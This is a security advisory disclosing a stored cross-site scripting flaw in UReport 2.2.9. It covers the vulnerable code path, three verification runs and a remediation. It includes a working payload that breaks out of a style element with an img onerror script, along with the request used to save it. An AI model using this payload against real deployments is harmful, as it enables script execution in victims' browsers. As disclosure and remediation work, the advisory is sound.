# UReport font-family style-element escape

## Summary

A cell font-family value is concatenated into generated CSS and rendered inside a style element without neutralizing a closing style tag.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored report.

Verified flow: `stored cell-style font-family -> ReportDefinition.buildStyle() -> htmlReport.style -> <style>${style}</style>`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a report cell whose font-family closes the style element and adds an HTML marker.
2. Save the report and confirm persistence.
3. Preview it and inspect the generated head style block and following IMG element.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>

file=URLENCODE×3("blade-gt48261022r43c.ureport.xml")
content=URLENCODE×2(<ureport><cell name="A1"><simple-value>R4C</simple-value>
 <cell-style font-family="x&amp;lt;/style&amp;gt;&amp;lt;img src=x onerror=self[`al`+`ert`](`gt48261022r43c`)&amp;gt;"/>
</cell>...</ureport>)

GET <BASE_URL>/blade-report/ureport/preview?_u=blade-gt48261022r43c.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt48261022r43a` | literal </style> + IMG | **PASS** |
| 2 | `gt48261022r43b` | literal </style> + IMG | **PASS** |
| 3 | `gt48261022r43c` | literal </style> + IMG | **PASS** |

```text
Saved run-3 head markup:
<style id="_ureport_table_style">
._A1{font-family:x</style><img src=x onerror=self[`al`+`ert`](`gt48261022r43c`)>;...}
</style>
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
CellStyleParser.java:90-92
style.setFontFamily(element.attributeValue("font-family"));

ReportDefinition.java:155-217
sb.append("font-family:" + fontFamily + ";");

ureport-html/html-preview.html:11-13
<style type="text/css" id="_ureport_table_style">${style}</style>
```

Root cause: An arbitrary report style property is concatenated into CSS, then the entire CSS string is trusted inside an HTML style element.

## Recommended remediation

Allowlist font-family tokens and serialize CSS from validated values. Neutralize HTML closing-tag sequences before placing CSS in an HTML style element.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-09 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/01-reproduction-v2.png)

### Three-run success proof

![CAN-09 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-09 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/03-source-sink-v2.png)
